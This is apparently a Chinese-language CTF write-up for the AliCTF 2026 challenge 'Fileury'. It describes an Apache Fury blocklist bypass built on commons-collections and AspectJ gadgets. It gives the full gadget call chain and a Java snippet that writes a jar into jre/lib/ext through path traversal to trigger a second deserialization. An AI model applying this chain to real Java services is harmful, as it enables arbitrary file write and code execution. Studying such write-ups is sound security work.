---
title: AliCTF 2026 SU WP - Fileury
contest: AliCTF
year: 2026
difficulty: hard
vuln_type: deserialize
tags: [Apache Fury, DisallowedList黑名单, SimpleCache$StoreableCachingMap, LazyMap, TiedMapEntry, TransformingComparator, StringValueTransformer, PriorityQueue, writeToPath, jre/lib/ext, dnsns.jar, DNSNameServiceDescriptor, 二次反序列化]
attack_chain:
  - Apache Fury 黑名单: requireClassRegistration(false) 仍走 DisallowedList
  - com.feilong 缺失 → 无法用去年二次反序列化思路
  - 未拦截: SimpleCache$StoreableCachingMap / LazyMap / TiedMapEntry / TransformingComparator / StringValueTransformer
  - PriorityQueue.readObject → heapify → comparator.compare
  - TransformingComparator(StringValueTransformer).compare
  - String.valueOf(TiedMapEntry) → toString → getValue
  - LazyMap.get(key) → ConstantFactory.create 返回预设 byte[]
  - StoreableCachingMap.put(key, value) → writeToPath 写文件
  - 写入 jre/lib/ext/dnsns.jar 自动加载
  - DNSNameServiceDescriptor 二次反序列化触发
key_payload: 'PriorityQueue + TransformingComparator(StringValueTransformer) + TiedMapEntry + LazyMap(StoreableCachingMap, ConstantFactory) + writeToPath / jre/lib/ext/dnsns.jar / DNSNameServiceDescriptor'
one_liner: AliCTF 2026 Fileury — Apache Fury 黑名单 bypass: SimpleCache$StoreableCachingMap + LazyMap + TiedMapEntry + TransformingComparator(StringValueTransformer) 链写 jre/lib/ext/dnsns.jar 自动加载触发 DNSNameService 二次反序列化。
lesson: Apache Fury 黑名单 checkNotInDisallowedList 只在序列化时走;LazyMap(StoreableCachingMap, ConstantFactory) 是新 gadget 链关键;jre/lib/ext 自动加载是经典文件写提权路径。
quality: high
---

# AliCTF 2026 SU WP - Fileury

## 速读
作者 SU 战队 — 阿里云 CTF 2026 Fileury 反序列化 + 任意文件写。

## Apache Fury 黑名单
```java
static void checkNotInDisallowedList(String clsName) {
    if (DEFAULT_DISALLOWED_LIST_SET.contains(clsName)) {
        throw new InsecureException(...);
    }
}
```

## 未拦截 Gadget
- `org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap`
- `org.apache.commons.collections.map.LazyMap`
- `org.apache.commons.collections.keyvalue.TiedMapEntry`
- `org.apache.commons.collections.comparators.TransformingComparator`
- `org.apache.commons.collections.functors.ConstantFactory`
- `org.apache.commons.collections.functors.StringValueTransformer`

## 链
```
PriorityQueue.readObject()
  → heapify()
  → siftDown()
  → comparator.compare(queue[0], queue[1])
  → TransformingComparator.compare()
  → StringValueTransformer.transform(TiedMapEntry)
  → String.valueOf(TiedMapEntry)
  → TiedMapEntry.toString()
  → TiedMapEntry.getValue()
  → LazyMap.get(key)
  → factory.create()  [ConstantFactory 返回预设 byte[]]
  → StoreableCachingMap.put(key, value)
  → 写入文件 key，内容为 value
```

## 关键
```java
String filename = "../../../../../../../../../usr/local/openjdk-8/jre/lib/ext/dnsns.jar";
Map storeableMap = (Map) constructor.newInstance(".", 100);
Map lazyMap = LazyMap.decorate(storeableMap, factory);
TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);
```

## 二次反序列化
- 写 `dnsns.jar` 到 `jre/lib/ext` 自动加载
- `DNSNameServiceDescriptor` 触发新一轮反序列化
